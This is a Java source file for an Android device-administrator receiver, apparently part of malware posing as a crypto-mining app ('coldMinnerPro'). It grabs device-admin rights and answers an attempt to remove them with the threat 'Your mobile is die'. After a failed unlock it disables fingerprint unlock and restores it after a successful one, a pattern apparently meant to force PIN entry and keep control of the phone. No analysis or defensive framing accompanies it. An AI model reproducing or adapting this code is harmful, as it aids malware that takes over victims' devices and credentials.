package com.crypto.coldMinnerPro.receivers;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.crypto.coldMinnerPro.utils.SharedPrefManager;
import com.crypto.coldMinnerPro.*;

public class AdminReceiverzxc extends DeviceAdminReceiver {
	
	private SharedPrefManager prefs;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		prefs = new SharedPrefManager(context);
		Log.i("Admin", "Admin Service Received");
	}
	
	@Override
	public void onEnabled(Context context, Intent intent) {
		prefs = new SharedPrefManager(context);
		prefs.setB("isAdminActive", true);
		try {
			Intent intent1 = new Intent(context, MainActivity.class);
			intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent1);
		} catch (Exception e) {
			Log.e("AdminActivation", "Error launching Activity: " + e.getMessage());
		}
		Log.i("Admin", "Admin Service Enabled");
	}
	
	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {
		prefs = new SharedPrefManager(context);
		Log.i("Admin", "Admin Service Desable Request Received");
		return "Your mobile is die";
	}
	
	@Override
	public void onDisabled(Context context, Intent intent) {
		prefs = new SharedPrefManager(context);
		prefs.setB("isAdminActive", false);
		Log.i("Admin", "Admin Service Disabled");
	}
	
	@Override
	@Deprecated
	public void onPasswordFailed(Context context, Intent intent) {
		try {
			ComponentName name = new ComponentName(context, AdminReceiverzxc.class);
			DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Activity.DEVICE_POLICY_SERVICE);
			int attempts = dpm.getCurrentFailedPasswordAttempts();
			dpm.setKeyguardDisabledFeatures(name, DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT);
			
		} catch (Exception e) {
			
		}
	}
	
	@Override
	@Deprecated
	public void onPasswordSucceeded(Context context, Intent intent) {
		try {
			ComponentName name = new ComponentName(context, AdminReceiverzxc.class);
			DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Activity.DEVICE_POLICY_SERVICE);
			dpm.setKeyguardDisabledFeatures(name, DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_NONE);
			
		} catch (Exception e) {
			
		}
	}
	
	
}
